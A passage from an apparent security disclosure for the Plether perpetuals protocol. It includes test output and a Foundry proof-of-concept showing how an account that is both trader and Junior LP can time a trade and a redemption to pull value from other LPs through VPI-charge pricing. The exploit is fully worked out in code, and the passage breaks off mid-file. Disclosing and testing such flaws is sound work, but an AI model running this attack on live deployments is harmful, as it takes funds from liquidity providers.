  attacker: one address, Junior deposit 3,000,000 per cycle, LONG 0.398 x depth filled e+2h-19s, closed e+2h+13s
| quantity (USDG)                              |          control |           attack | attack - control |
|----------------------------------------------|------------------|------------------|------------------|
| attacker net (wallet - minted, cumulative)   |         0.000000 |      1318.319349 |      1318.319349 |
| independent 100k LP value @ checkpoint       |     99996.612208 |     99802.955166 |      -193.657042 |
| independent 100k LP realized redemption      |     99995.848841 |     99802.191798 |      -193.657043 |
| other Junior holders value @ checkpoint      |   1099965.732704 |   1097835.498434 |     -2130.234270 |
| Senior value @ checkpoint                    |   1000038.267295 |   1000038.267295 |         0.000000 |
| protocol treasury balance @ checkpoint       |         0.000000 |       811.914921 |       811.914921 |
  conservation: others' loss - (attacker net + treasury delta) = 0 atoms
  leg notional 2029787.303664 | charge C 4039.249092 | pool cash in at open 4039.249092 | theta 0.7317 | theta*C 2955.559842
  depth open / close 5100003.000000 / 2101101.096834 | fresh close rebate 9804.469914 | close VPI (receipt) -4039.249092
  attacker LP P&L 2942.195014 | trade P&L -1623.875665 | of which execution fees 1623.829842
```

Forge prints the tests alphabetically, so test 3 (`test_constantDepthControl`) appears first. In that run an unrelated depositor enters at the exit settlement and bears most of the refund, so the independent LP is +20.98 against its control there (see Impact Details).

**Tests.**

1. `test_lateVchg_singleCycle`: one cycle against the control.
2. `test_control_noAttacker`: the same schedule without the attacker.
3. `test_constantDepthControl`: an unrelated 3M deposit lands at the exit settlement.
4. `test_threeCycles`: three back-to-back cycles.

**Assertions in every attack cycle:**

- identical timestamps to the control;
- Senior value equal to the atom;
- pool cash rises by exactly C at the open;
- the leg's lifetime VPI is ≥ 0;
- trade P&L ≤ −(open fee + close fee);
- the LP leg gains, within 1 % of θ·C;
- non-attacker Junior holders lose;
- conservation (others' loss = attacker net + treasury change) holds within 10 atoms (measured 0);
- afterwards the attacker has no position, no clearinghouse balance and no shares;
- the exit is fully funded.

**Assertions specific to each test:**

1. Attacker net > 0. The independent LP realizes less than in the control. Its realized loss equals its valued loss within 10 atoms (measured 1). Close VPI == −C exactly, and the fresh close rebate is > C.
2. The schedule timestamps hold, and no fees are paid. The independent LP loses only its coupon share (< 10 USDG), and Junior pays only the coupon.
3. Close depth ≥ open depth. Close VPI equals the fresh curve value (±2 atoms), and −close VPI < C. Attacker net equals θ·C − fees within 1 % of θ·C, and is within 1 % of the clamp-binding run. The depositor admitted at the inflated NAV loses.
4. Every cycle is net-profitable, and the independent LP realizes less than in the control.

### Attached source file

<details>
<summary><b><ins><code>C03LateVchgJuniorDilution.t.sol</code></ins></b></summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdMath} from "@plether/perps/CfdMath.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @title A Junior LP exits at a NAV that includes its own VPI charge, which its own close refunds after the exit;
///        the remaining Junior LPs fund the refund.
/// @notice Root cause (a82d4fef):
///   1. A skew-increasing open pays VPI charge C. It is booked at once as pool Revenue/CashArrived
///      (CfdEngineSettlementSidecar.sol:454-463), so C is in Junior principal at the next LP settlement.
///   2. Junior redemptions and deposits are priced at that post-reconcile principal (HousePool.sol:835, :840, :915).
///   3. A full close that restores the skew earns the VPI rebate from pool cash, which the lifetime clamp caps at C
///      (CloseAccountingLib.sol:107-118, "Prevents LP sandwich attacks"): the trader gets C back, or slightly less.
///   An account that is both trader and Junior LP opens a LONG after the LP request cutoff of its own exit epoch,
///   redeems at the NAV that includes C, then closes. Its trading VPI nets to 0 (or to a small positive amount).
///   Its redemption carries theta*C, where theta is its Junior share. The other Junior LPs pay the refund from principal.
/// @dev Repo Foundry suite at a82d4fef; nothing in packages/perps/src is modified. Release parameters
///      (packages/perps/DEPLOYMENT.md) are set by owner calls in setUp only and asserted there. Every later action uses a
///      public entrypoint: TrancheVault request/claim, Router.settleLpEpoch (any caller), and Router.commitOrder /
///      executeOrder with the production V3 request (the attacker executes its own orders; keepers are permissionless).
///      The only mocks are out-of-scope components: MockPyth explicit payloads at a constant basket 0.96066417 with zero
///      confidence, and the mintable settlement token used as USDG. No BasePerpTest helper that pranks the Router or
///      Engine is used. Run:
///      FOUNDRY_SPARSE_MODE=true forge test --root packages/perps --match-path test/poc/C03LateVchgJuniorDilution.t.sol -vv
contract C03LateVchgJuniorDilutionTest is BasePerpTest {

    uint256 internal constant PX = 96_066_417; // constant basket price (8 decimals)
    uint256 internal constant LOT = 1e20; // position size quantum = 100 synthetic tokens
    uint256 internal constant VPI_K = 0.01e18;
    uint256 internal constant T0 = SETUP_TIMESTAMP + 7 days; // Mon 2024-03-11 06:00:00Z
    uint256 internal constant E1 = T0 + 4 hours; // first activation epoch: Mon 10:00:00Z
    uint256 internal constant A = 3_000_000e6; // attacker Junior deposit per cycle
    uint256 internal constant J_VICTIM = 1_000_000e6;
    uint256 internal constant J_INDEP = 100_000e6;
    uint256 internal constant S_VICTIM = 1_000_000e6;

    address internal constant ATTACKER = address(uint160(0xA77AC4E5));
    address internal constant VICTIM_JR = address(uint160(0x71C71A01)); // pre-existing Junior LP, 1M
    address internal constant INDEP_LP = address(uint160(0x1D1D0100)); // independent pre-existing Junior LP, 100k
    address internal constant VICTIM_SR = address(uint160(0x71C71A02)); // Senior LP, 1M
    address internal constant NEW_LP = address(uint160(0x0E70D0E1)); // unrelated depositor (constant-depth control)
    address internal constant BYSTANDER = address(uint160(0xB7574D01)); // 1 USDG Junior requests (see _poke)
    address internal constant KEEPER = address(uint160(0x6EE9E701)); // neutral caller of permissionless settlements

    struct Cyc {
        uint256 e; // activation epoch start
        uint256 depositId; // attacker deposit request id (= epoch e)
        uint256 redeemId; // attacker redeem request id (= epoch e + 2h)
        uint256 newLpId; // unrelated depositor's request id (constant-depth control)
        uint256 shares; // attacker Junior shares
        uint256 legNotional; // executed LONG notional
        uint256 charge; // C = vpiAccrued after the open
        uint256 poolInAtOpen; // pool totalAssets increase at the open fill
        uint256 depthOpen; // net depth the open's VPI used (receipt)
        uint256 depthClose; // net depth the close's VPI used (receipt)
        uint256 freshCloseRebate; // unclamped close rebate cost(skew) at depthClose
        int256 closeVpi; // close receipt vpiAssets (after the lifetime clamp)
        uint256 fees; // open + close execution fees (receipts)
        uint256 thetaWad; // attacker share of Junior supply at the exit settlement
        int256 lpPnl; // USDG redeemed - A
        int256 tradePnl; // clearinghouse withdrawn - deposited
        uint256 others; // checkpoint: value of every non-attacker Junior share
        uint256 senior; // checkpoint: value of every Senior share
        uint256 treasury; // checkpoint: protocol treasury clearinghouse balance
        int256 attackerNet; // checkpoint: attacker wallet - USDG minted to it (cumulative)
        uint256 newLpValue; // checkpoint: value of NEW_LP's shares (constant-depth control only)
        uint256 indepValue; // checkpoint: value of INDEP_LP's shares
        uint256 tActivation; // timestamps: activation settlement, redeem request, exit settlement, checkpoint
        uint256 tRedeemRequest;
        uint256 tExit;
        uint256 tCheckpoint;
    }

    struct Run {
        Cyc[] cyc;
        uint256 indepRealized; // USDG the independent 100k LP receives when it redeems after the last cycle
        uint256 indepExitTime;
    }

    uint256 internal minted; // fresh USDG minted to the attacker
    uint256 internal nonce;
    bool internal attackOn; // scenario switch: attacker actions on/off (everything else identical)
    uint256 internal newLpAmount; // scenario switch: unrelated deposit landing at the exit settlement (test 3)

    function setUp() public override {
        super.setUp(); // owner deploys with the release risk params, seeds 1 USDG per tranche, activates trading
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.minOpenNotionalAssets = 1000e6; // release Router wrapper
        config.adverseConfidenceMultiplierBps = 2500; // release Oracle wrapper
        _setRouterConfig(config);
        _setSeniorCapacity(40_000_000e6, 8000); // release HousePool wrapper

        CfdTypes.RiskParams memory rp = _engineRiskConfig().riskParams;
        assertEq(rp.vpiFactor, 0.01e18, "vpiFactor");
        assertEq(rp.maxSkewRatio, 0.4e18, "maxSkewRatio");
        assertEq(rp.maintMarginBps, 10, "MM 0.1%");
        assertEq(rp.initMarginBps, 20, "IM 0.2%");
        assertEq(rp.fadMarginBps, 300, "frozen margin 3%");
        assertEq(rp.baseCarryBps, 500, "carry");
        assertEq(rp.bountyBps, 10, "liquidation charge 10 bps");
        assertEq(rp.minBountyAssets, 1e6, "liquidation charge min 1 USDG");
        assertEq(rp.keeperShareBps, 5000, "keeper share");
        assertEq(rp.protocolShareBps, 0, "protocol share");
        assertEq(engine.executionFeeBps(), 4, "execution fee 4 bps");
        assertEq(engine.frozenCloseSpreadBps(), 50, "frozen close spread 0.50%");
        assertEq(engine.settlementBufferBps(), 25, "settlement buffer");
        assertEq(engine.fadRunwaySeconds(), 1 hours, "FAD runway");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "Senior cap 40M");
        assertEq(pool.maxSeniorShareBps(), 8000, "Senior cap 80%");
        assertEq(pool.seniorRateBps(), 800, "Senior rate");
        assertEq(juniorVault.maintenanceFeeAprBps(), 0, "Junior fee 0");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "min open notional");
        assertEq(router.maxPendingOrders(), 5, "max pending orders");
        assertEq(router.positionProtectionTriggerBountyAssets(), 0.2e6, "trigger bounty");
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500, "adverse confidence multiplier");
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10, "basket confidence");

        // Market: Junior 1M (VICTIM_JR) + 100k (INDEP_LP), Senior 1M, zero OI. Public LP routes only.
        _warpTo(T0);
        uint256 jv = _requestDeposit(juniorVault, VICTIM_JR, J_VICTIM);
        uint256 ji = _requestDeposit(juniorVault, INDEP_LP, J_INDEP);
        _warpTo(T0 + 1 hours + 10);
        _settle();
        _claimDeposit(juniorVault, VICTIM_JR, jv);
        _claimDeposit(juniorVault, INDEP_LP, ji);
        uint256 sv = _requestDeposit(seniorVault, VICTIM_SR, S_VICTIM);
        _warpTo(T0 + 2 hours + 10);
        _settle();
        _claimDeposit(seniorVault, VICTIM_SR, sv);
        assertEq(_sideOpenInterest(CfdTypes.Side.LONG) + _sideOpenInterest(CfdTypes.Side.SHORT), 0, "zero OI");
        assertApproxEqAbs(pool.juniorPrincipal(), J_VICTIM + J_INDEP + 1e6, 1e6, "Junior ~1.1M");
        assertApproxEqAbs(pool.seniorPrincipal(), S_VICTIM + 1e6, 1e6, "Senior ~1M");
    }

    // ================================================================== scenario: one late V-chg cycle on epoch e
    /// @dev Every scenario performs the same public LP/oracle actions at the same timestamps; `attackOn` switches only
    ///      the attacker's own actions. `newLpAmount` > 0 adds an unrelated deposit that activates at the exit settlement.
    ///      e-50m   poke; attacker requestDeposit(A) -> epoch e
    ///      e+10    Router.settleLpEpoch: deposit activates at the fair NAV (no position open); claimDeposit
    ///      e+1h+11 poke; [NEW_LP requestDeposit]; attacker requestRedeem(all) -> epoch e+2h (cutoff e+2h-5m)
    ///      e+2h-20 attacker commits a LONG at ~0.398 x depth (after the cutoff); e+2h-19 self-executes: charge C
    ///      e+2h+10 Router.settleLpEpoch: redemption priced with C in Junior principal; claimRedeem
    ///      e+2h+12 attacker commits the full close; e+2h+13 self-executes: the close rebate returns ~C; withdraw
    ///      e+2h+5m checkpoint
    function _cycle(
        Cyc memory c
    ) internal {
        _warpTo(c.e - 50 minutes);
        _poke();
        if (attackOn) {
            c.depositId = _requestDeposit(juniorVault, ATTACKER, A);
            assertEq(c.depositId, c.e / 1 hours, "deposit targets epoch e");
        }
        _warpTo(c.e + 10);
        _settle();
        c.tActivation = _now();
        if (attackOn) {
            c.shares = _claimDeposit(juniorVault, ATTACKER, c.depositId);
        }

        _warpTo(c.e + 1 hours + 11);
        _poke();
        c.tRedeemRequest = _now();
        if (newLpAmount != 0) {
            c.newLpId = _requestDeposit(juniorVault, NEW_LP, newLpAmount);
        }
        if (attackOn) {
            vm.prank(ATTACKER);
            c.redeemId = juniorVault.requestRedeem(c.shares, ATTACKER, ATTACKER);
            assertEq(c.redeemId, (c.e + 2 hours) / 1 hours, "redeem targets epoch e + 2h");
            _openLeg(c, c.e + 2 hours - 20);
            c.thetaWad = c.shares * 1e18 / juniorVault.accruedTotalSupply();
        }

        _warpTo(c.e + 2 hours + 10);
        _settle();
        c.tExit = _now();
        if (newLpAmount != 0) {
            _claimDeposit(juniorVault, NEW_LP, c.newLpId);
        }
        if (attackOn) {
            assertEq(juniorVault.claimableRedeemRequest(c.redeemId, ATTACKER), c.shares, "exit fully funded");
            vm.prank(ATTACKER);
            c.lpPnl = int256(juniorVault.claimRedeem(c.redeemId, c.shares, ATTACKER, ATTACKER)) - int256(A);
            _closeLeg(c, c.e + 2 hours + 12);
            _assertAttackerOut();
        }
        _checkpoint(c);
    }

    /// @dev `cycles` back-to-back cycles (3 h cadence: activation e, exit e+2h, next activation e+3h). Then the
    ///      independent 100k LP requests redemption after the last checkpoint and redeems at the next epoch.
    function _run(
        bool attack,
        uint256 cycles,
        uint256 newLp
    ) internal returns (Run memory r) {
        attackOn = attack;
        newLpAmount = newLp;
        r.cyc = new Cyc[](cycles);
        for (uint256 k; k < cycles; ++k) {
            r.cyc[k].e = E1 + k * 3 hours;
            _cycle(r.cyc[k]);
        }
        uint256 eLast = E1 + (cycles - 1) * 3 hours;
        _warpTo(eLast + 2 hours + 6 minutes);
        uint256 shares = juniorVault.balanceOf(INDEP_LP);
        vm.prank(INDEP_LP);
        uint256 rid = juniorVault.requestRedeem(shares, INDEP_LP, INDEP_LP);
        _warpTo(eLast + 3 hours + 10);
        _settle();
        assertEq(juniorVault.claimableRedeemRequest(rid, INDEP_LP), shares, "independent LP exit fully funded");
        vm.prank(INDEP_LP);
        r.indepRealized = juniorVault.claimRedeem(rid, shares, INDEP_LP, INDEP_LP);
        r.indepExitTime = _now();
    }

    /// @dev Per-cycle checks against the time-matched control (same code path with `attackOn` false).
    function _assertCycle(
        Cyc memory atk,
        Cyc memory ctl
    ) internal pure {
        assertEq(atk.tActivation, ctl.tActivation, "identical timestamps");
        assertEq(atk.tRedeemRequest, ctl.tRedeemRequest, "identical timestamps");
        assertEq(atk.tExit, ctl.tExit, "identical timestamps");
        assertEq(atk.tCheckpoint, ctl.tCheckpoint, "identical timestamps");
        assertEq(atk.senior, ctl.senior, "Senior value unchanged");
        assertEq(atk.poolInAtOpen, atk.charge, "pool cash (Junior NAV) rises by exactly C at the open");
        assertGe(atk.closeVpi + int256(atk.charge), 0, "lifetime VPI of the leg >= 0: no VPI profit for the trader");
        assertLe(atk.tradePnl, -int256(atk.fees), "trade leg loses at least both execution fees");
        assertGt(atk.lpPnl, 0, "LP leg gains");
        assertApproxEqRel(uint256(atk.lpPnl), atk.thetaWad * atk.charge / 1e18, 0.01e18, "LP leg earns ~theta*C");
        int256 othersDelta = int256(atk.others) - int256(ctl.others);
        int256 treasuryDelta = int256(atk.treasury) - int256(ctl.treasury);
        assertLt(othersDelta, 0, "non-attacker Junior holders lose");
        assertApproxEqAbs(-othersDelta, atk.attackerNet + treasuryDelta, 10, "conservation: loss == gain + fees");
    }

    // ================================================================== tests
    /// @notice (1) One late V-chg cycle vs the no-attacker control at identical timestamps.
    function test_lateVchg_singleCycle() public {
        uint256 snap = vm.snapshotState();
        Run memory ctl = _run(false, 1, 0);
        vm.revertToState(snap);
        Run memory atk = _run(true, 1, 0);
        Cyc memory a = atk.cyc[0];
        _printComparison("(1) late V-chg, one cycle: control vs attack at identical timestamps", ctl, atk, 0);

        _assertCycle(a, ctl.cyc[0]);
        assertGt(a.attackerNet, 0, "attacker net USDG gain > 0 after all fees");
        assertEq(atk.indepExitTime, ctl.indepExitTime, "identical exit timestamps");
        assertLt(atk.indepRealized, ctl.indepRealized, "independent LP realizes less than in the control");
        assertApproxEqAbs(
            int256(atk.indepRealized) - int256(ctl.indepRealized),
            int256(a.indepValue) - int256(ctl.cyc[0].indepValue),
            10,
            "independent LP: realized delta == valued delta at the checkpoint"
        );
        assertEq(a.closeVpi, -int256(a.charge), "close VPI == -C: the clamp caps the rebate at exactly C");
        assertGt(a.freshCloseRebate, a.charge, "clamp binds: the fresh rebate at the lower close depth exceeds C");
    }

    /// @notice (2) The same schedule with no attacker: the baseline that (1), (3) and (4) re-run internally.
    function test_control_noAttacker() public {
        uint256 others0 = _juniorValue(juniorVault.accruedTotalSupply());
        Run memory ctl = _run(false, 1, 0);
        Cyc memory c = ctl.cyc[0];
        _printControl(others0, ctl);

        assertEq(c.tActivation, E1 + 10, "schedule: activation settlement");
        assertEq(c.tRedeemRequest, E1 + 1 hours + 11, "schedule: redeem request");
        assertEq(c.tExit, E1 + 2 hours + 10, "schedule: exit settlement");
        assertEq(c.tCheckpoint, E1 + 2 hours + 5 minutes, "schedule: checkpoint");
        assertEq(ctl.indepExitTime, E1 + 3 hours + 10, "independent LP exit timestamp");
        assertEq(c.attackerNet, 0, "no attacker activity");
        assertEq(c.treasury, 0, "no fees without trading");
        // without the attacker the independent LP only pays its share of the Senior coupon (< 10 USDG here)
        assertLe(ctl.indepRealized, J_INDEP, "no gain without the attacker");
        assertGe(ctl.indepRealized, J_INDEP - 10e6, "loses only the Senior coupon share");
        assertLe(c.others, others0, "Junior only pays the Senior coupon");
        assertGe(c.others + 100e6, others0, "Junior only pays the Senior coupon");
    }

    /// @notice (3) Constant-depth control: an unrelated depositor requests 3M for the exit epoch (before the cutoff, so
    ///         before the leg exists). Close depth >= open depth, the clamp does not bind, the close VPI is the fresh
    ///         curve value, and the attacker still extracts ~theta*C - fees through LP exit pricing alone.
    function test_constantDepthControl() public {
        uint256 snap = vm.snapshotState();
        Run memory ctl = _run(false, 1, A);
        vm.revertToState(snap);
        Run memory atk = _run(true, 1, A);
        vm.revertToState(snap);
        Run memory binding = _run(true, 1, 0); // reference: depth drops at close, the clamp binds (test 1 setup)
        Cyc memory a = atk.cyc[0];
        Cyc memory c = ctl.cyc[0];
        int256 thetaC = int256(a.thetaWad * a.charge / 1e18);
        _printComparison("(3) constant-depth control: unrelated 3M deposit lands at the exit settlement", ctl, atk, 0);
        _printConstantDepth(a, c, binding.cyc[0]);

        _assertCycle(a, c);
        assertGe(a.depthClose, a.depthOpen, "close depth >= open depth");
        // Fresh curve value at the receipt depth. The planner also realizes the last ~1 s of carry (~0.0013 USDG) into
        // depth before pricing the close (CfdEnginePlanLib.sol:638): <= 1 atom of VPI here. A binding clamp would give
        // exactly -C instead, 0.87 USDG away.
        assertApproxEqAbs(a.closeVpi, -int256(a.freshCloseRebate), 2, "close VPI == fresh curve value at close depth");
        assertLt(-a.closeVpi, int256(a.charge), "clamp does not bind (a binding clamp gives exactly -C)");
        assertGt(a.attackerNet, 0, "attacker net gain > 0");
        assertApproxEqAbs(a.attackerNet, thetaC - int256(a.fees), uint256(thetaC) / 100, "net ~ theta*C - fees");
        assertApproxEqRel(a.attackerNet, binding.cyc[0].attackerNet, 0.01e18, "same gain with or without depth drop");
        assertLt(a.newLpValue, c.newLpValue, "unrelated depositor admitted at the inflated NAV loses");
    }

    /// @notice (4) Three back-to-back cycles (activations Mon 10:00Z, 13:00Z, 16:00Z) vs the control.
    function test_threeCycles() public {
        uint256 snap = vm.snapshotState();
        Run memory ctl = _run(false, 3, 0);
        vm.revertToState(snap);
        Run memory atk = _run(true, 3, 0);
        _printThreeCycles(ctl, atk);

        int256 prev;
        for (uint256 k; k < 3; ++k) {
            _assertCycle(atk.cyc[k], ctl.cyc[k]);
            assertGt(atk.cyc[k].attackerNet - prev, 0, "every cycle net-profitable");
            prev = atk.cyc[k].attackerNet;
        }
        assertEq(atk.indepExitTime, ctl.indepExitTime, "identical exit timestamps");
        assertLt(atk.indepRealized, ctl.indepRealized, "independent LP realizes less than in the control");
    }

    // ================================================================== helpers: attacker legs and checkpoint valuation
    function _openLeg(
        Cyc memory c,
        uint256 at
    ) internal {
        _warpTo(at);
        uint256 depth = _depth();
        uint256 leg = depth * 3980 / 10_000; // just below the 0.4 x depth skew cap
        uint256 exitFloor = (depth - A) * 99 / 100; // the exit must stay fundable after reserving the LONG
        if (leg > exitFloor) {
            leg = exitFloor;
        }
        uint256 lots = leg / PX;
        uint256 margin = lots * PX / 100 + 10e6; // 1% margin (5x IM)
        uint256 funding = margin + lots * PX / 200 + 20e6; // + VPI charge (~0.2%) + fee + open bounty buffer
        _fundAttacker(funding);
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(clearinghouse), funding);
        clearinghouse.deposit(ATTACKER, funding);
        vm.stopPrank();
        c.tradePnl -= int256(funding);
        uint256 poolBefore = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        OrderV3Types.OrderReceipt memory rc = _trade(CfdTypes.Side.LONG, lots * LOT, margin, false);
        c.poolInAtOpen = pool.totalAssets() - poolBefore;
        c.depthOpen = rc.poolDepthAssets - claims;
        c.legNotional = rc.economics.executionNotionalAssets;
        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER);
        c.charge = uint256(vpiAccrued);
        assertEq(rc.economics.vpiAssets, vpiAccrued, "open receipt VPI == accrued charge");
        c.fees += rc.economics.executionFeeAssets;
    }

    function _closeLeg(
        Cyc memory c,
        uint256 at
    ) internal {
        _warpTo(at);
        (uint256 size,,,,,,) = engine.positions(ATTACKER);
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        OrderV3Types.OrderReceipt memory rc = _trade(CfdTypes.Side.LONG, size, 0, true);
        // close VPI inputs as the engine saw them (receipt): HousePool.totalAssets() at execution minus trader claims,
        // and the fill price. Unclamped close VPI = -(cost(skew) - cost(0)) at that depth.
        c.depthClose = rc.poolDepthAssets - claims;
        c.freshCloseRebate = CfdMath.getSkewCost(size * rc.executionPrice / LOT, c.depthClose, VPI_K);
        c.closeVpi = rc.economics.vpiAssets;
        c.fees += rc.economics.executionFeeAssets;
        uint256 bal = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, bal);
        c.tradePnl += int256(bal);
    }

    function _checkpoint(
        Cyc memory c
    ) internal {
        _warpTo(c.e + 2 hours + 5 minutes);
        c.tCheckpoint = _now();
        c.others = _juniorValue(juniorVault.accruedTotalSupply() - juniorVault.balanceOf(ATTACKER));
        (uint256 s,,,) = pool.getPendingTrancheState();
        uint256 sSupply = seniorVault.accruedTotalSupply();
        c.senior = housePoolRedemptionMathSidecar.netAssetsForShares(sSupply, s, sSupply, 1, 1000, 0);
        c.treasury = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        c.attackerNet = int256(settlementToken.balanceOf(ATTACKER)) - int256(minted);
        c.newLpValue = _juniorValue(juniorVault.balanceOf(NEW_LP));
        c.indepValue = _juniorValue(juniorVault.balanceOf(INDEP_LP));
    }

    // ================================================================== helpers: release configuration (DEPLOYMENT.md)
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: VPI_K,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0; // the default would fund 1M through a Router-pranking helper; LPs use public routes instead
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    // ================================================================== helpers: time, oracle, trading, LP
    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp(); // block fields are cached by the optimizer within a test call
    }

    function _warpTo(
        uint256 t
    ) internal {
        require(t > _now(), "time only moves forward");
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _fresh() internal {
        if (_now() <= engine.lastMarkTime()) {
            _warpTo(engine.lastMarkTime() + 1);
        }
    }

    /// @dev MockPyth explicit payload (out-of-scope Pyth replaced): both basket feeds at PX, zero confidence.
    function _tick(
        uint256 publishTime
    ) internal pure returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](2);
        for (uint256 i; i < 2; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                bytes32(i + 1), MockPyth.MockPrice(int64(uint64(PX)), 0, int32(-8), publishTime, publishTime - 1)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    /// @dev Router.settleLpEpoch (permissionless): installs a current-epoch mark and settles matured LP epochs.
    function _settle() internal {
        _fresh();
        bytes[] memory data = _tick(_now());
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
    }

    /// @dev Commit at t by the attacker; the attacker executes its own order at t+1 with the first post-commit tick and
    ///      the authenticated receipt is returned.
    function _trade(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderReceipt memory rc) {
        _fresh();
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = bytes32(++nonce);
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.isClose = isClose;
        request.targetPrice = (isClose == (side == CfdTypes.Side.LONG)) ? CAP_PRICE : 1;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(_now() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        vm.prank(ATTACKER);
        uint64 id = router.commitOrder(request);
        _warpTo(_now() + 1);
        bytes[] memory data = _tick(_now());
        _startRecordingLogs();
        vm.prank(ATTACKER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
        require(result.status == OrderV3Types.LifecycleStatus.Executed, "order not executed");
        rc = _verifiedReceipt(IOrderLifecycleBook(address(router.lifecycleBook())), id);
    }

    function _fundAttacker(
        uint256 need
    ) internal {
        uint256 have = settlementToken.balanceOf(ATTACKER);
        if (have < need) {
            settlementToken.mint(ATTACKER, need - have);
            minted += need - have;
        }
    }

    function _requestDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 requestId) {
        if (lp == ATTACKER) {
            _fundAttacker(amount);
        } else {
            settlementToken.mint(lp, amount);
        }
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    function _claimDeposit(
        TrancheVault vault,
        address lp,
        uint256 requestId
    ) internal returns (uint256 shares) {
        uint256 assets = vault.claimableDepositRequest(requestId, lp);
        assertGt(assets, 0, "deposit activated");
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, assets, lp, lp);
    }

    /// @dev 1 USDG Junior request before every settlement in every scenario: a settlement with no matured LP work
    ///      reverts HousePool__NoLpEpochProgress, and the controls must settle at the attack's timestamps.
    function _poke() internal {
        _requestDeposit(juniorVault, BYSTANDER, 1e6);
    }

    function _depth() internal view returns (uint256) {
        return pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
    }

    /// @dev Redemption value of Junior shares on the projected post-reconcile principal (fee 0 in live mode).
    function _juniorValue(
        uint256 shares
    ) internal view returns (uint256) {
        (, uint256 j,,) = pool.getPendingTrancheState();
        return
            housePoolRedemptionMathSidecar.netAssetsForShares(shares, j, juniorVault.accruedTotalSupply(), 1, 1000, 0);
    }

    function _assertAttackerOut() internal view {
        (uint256 size,,,,,,) = engine.positions(ATTACKER);
        assertEq(size, 0, "attacker position closed");
        assertEq(clearinghouse.balanceAssets(ATTACKER), 0, "attacker clearinghouse balance withdrawn");
        assertEq(juniorVault.balanceOf(ATTACKER), 0, "attacker holds no Junior shares");
    }

    // ================================================================== helpers: console tables
    function _printHeader(
        string memory title
    ) internal pure {
        console2.log("");
        console2.log(string.concat("===== ", title));
        console2.log(
            "  pool: Junior 1M victim + 100k independent + 1 seed, Senior 1M + 1 seed, zero OI, mark 0.96066417"
        );
        console2.log(
            "  attacker: one address, Junior deposit 3,000,000 per cycle, LONG 0.398 x depth filled e+2h-19s, closed e+2h+13s"
        );
    }

    function _printComparison(
        string memory title,
        Run memory ctl,
        Run memory atk,
        uint256 k
    ) internal pure {
        Cyc memory a = atk.cyc[k];
        Cyc memory c = ctl.cyc[k];
        _printHeader(title);
        console2.log(
            "| quantity (USDG)                              |          control |           attack | attack - control |"
        );
        console2.log(
            "|----------------------------------------------|------------------|------------------|------------------|"
        );
        _row("attacker net (wallet - minted, cumulative)", c.attackerNet, a.attackerNet);
        _row("independent 100k LP value @ checkpoint", int256(c.indepValue), int256(a.indepValue));
        _row("independent 100k LP realized redemption", int256(ctl.indepRealized), int256(atk.indepRealized));
        _row("other Junior holders value @ checkpoint", int256(c.others), int256(a.others));
        _row("Senior value @ checkpoint", int256(c.senior), int256(a.senior));
        _row("protocol treasury balance @ checkpoint", int256(c.treasury), int256(a.treasury));
        int256 residual = int256(c.others) - int256(a.others) - a.attackerNet - int256(a.treasury) + int256(c.treasury);
        console2.log(
            string.concat(
